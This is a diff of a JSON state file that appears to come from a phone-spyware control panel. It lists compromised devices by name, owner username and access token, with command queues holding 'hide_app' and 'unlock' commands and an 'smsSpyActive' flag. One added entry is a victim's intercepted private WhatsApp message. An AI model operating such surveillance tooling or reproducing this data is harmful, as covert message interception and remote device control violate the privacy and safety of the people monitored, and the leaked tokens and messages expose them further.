@@ -4037,15 +4037,8 @@
     "deviceName": "HP-MEMEM-A001",
     "ownerUsername": "RIXX09",
     "token": "fb008139c6083d4cb9aa61f99b737696",
-    "lastSeen": 1777189814912,
+    "lastSeen": 1777197560592,
     "commandQueue": [
-      {
-        "type": "hide_app",
-        "payload": {
-          "hide": true
-        },
-        "sentAt": 1777189827145
-      },
       {
         "type": "unlock",
         "payload": {},
@@ -4084,6 +4077,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Asyra✨",
+        "content": "Cik besok awak jemputi aku jam setengah 4",
+        "time": "26/04 17:27",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777197560599
+      },
       {
         "appName": "WhatsApp",
         "sender": "Cwe cantik[(/ only 7 members",
@@ -7976,7 +7977,7 @@
     "deviceName": "HP-RRR-85A1",
     "ownerUsername": "raditcees",
     "token": "d40c7b4bef4b07ee53e2456f723de6fe",
-    "lastSeen": 1777197549231,
+    "lastSeen": 1777197558420,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T07:30:11.065Z",
